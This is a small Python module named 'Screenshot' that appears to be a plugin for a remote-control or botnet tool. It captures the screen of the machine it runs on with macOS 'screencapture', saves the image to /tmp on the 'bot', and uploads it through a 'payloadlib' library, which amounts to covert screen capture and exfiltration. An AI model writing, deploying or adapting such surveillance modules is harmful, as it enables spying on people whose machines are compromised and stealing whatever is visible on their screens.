'''
NAME: Screenshot
DESCRIPTION: Takes screenshot and saves image to bot's /tmp folder
'''

import os
import sys
import datetime

filename = '/tmp/screen-{}.png'.format(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))
if os.system('screencapture '+filename) == 0:
    sys.stdout.write("Screenshot successful\n")
    payloadlib.upload(filename)
else:
    sys.stderr.write("Screenshot failed\n")